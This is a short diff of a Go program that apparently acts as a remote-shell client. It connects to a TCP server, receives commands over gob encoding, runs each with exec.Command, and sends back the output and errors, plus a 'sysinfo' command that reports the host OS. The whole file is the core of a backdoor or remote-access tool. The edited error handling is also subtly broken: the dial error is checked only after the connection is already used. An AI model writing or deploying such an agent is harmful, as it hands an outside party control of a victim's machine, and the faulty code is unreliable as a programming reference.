@@ -3,9 +3,7 @@ package main
 import (
 	// Standard
 	"strings"
-	"fmt"
 	"encoding/gob"
-	"log"
 	"net"
 	"os/exec"
 	"runtime"
@@ -13,38 +11,33 @@ import (
 
 
 func main() {
-
 	conn, err := net.Dial("tcp", "localhost:8080")
-
-	if err != nil {
-		log.Fatal("Connection failled with", err)
-	}
 
 	cmd := ""
 	dec := gob.NewDecoder(conn)
 	enc := gob.NewEncoder(conn)
 
-	for cmd != "close" {
+	if err != nil {
+		enc.Encode(err)
+	}
 
-		//cmd, _ = bufio.NewReader(conn).ReadString('\n')
+	for cmd != "close" {
 
 		dec.Decode(&cmd)
 		cmd = strings.TrimSuffix(cmd, "\n")
-			
 	
 		switch {
 		case cmd == "close":
+		case cmd == "exit":
 			break
-
 		case cmd == "sysinfo":
 			osType := runtime.GOOS
 			enc.Encode(osType)
-
 		default:
 			out, err := exec.Command(cmd).Output()
 		
 			if err != nil {
-				fmt.Println("", err)
+				enc.Encode(err)
 			}
 
 			output := string(out[:])
